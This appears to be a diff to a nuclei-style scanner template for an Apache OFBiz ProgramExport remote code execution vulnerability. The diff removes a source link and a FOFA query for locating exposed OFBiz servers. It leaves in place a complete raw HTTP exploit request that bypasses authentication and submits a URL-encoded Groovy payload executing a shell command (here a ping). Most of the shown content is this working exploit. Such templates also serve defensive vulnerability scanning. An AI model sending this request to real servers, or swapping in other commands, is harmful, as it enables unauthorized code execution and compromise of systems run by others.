@@ -3,12 +3,8 @@ info:
   name: Apache OFBiz ProgramExport RCE
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xzn4z27lm1l6a5z0'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xzn4z27lm1l6a5z0
-    fofa: 'cert="Organizational Unit: Apache OFBiz" || (body="www.ofbiz.org" && body="/images/ofbiz_powered.gif") || header="Set-Cookie: OFBiz.Visitor" || banner="Set-Cookie: OFBiz.Visitor"'
 http:
 - raw:
   - 'POST /webtools/control/ProgramExport?USERNAME=&PASSWORD=&requirePasswordChange=Y HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Connection: close
-
-
 
 
     groovyProgram=import+groovy.lang.GroovyShell%0D%0A%0D%0AGroovyShell+shell+%3D+new+GroovyShell%28%29%3B%0D%0Ashell.evaluate%28%27%22ping www.baidu.com%22.execute%28%29%27%29
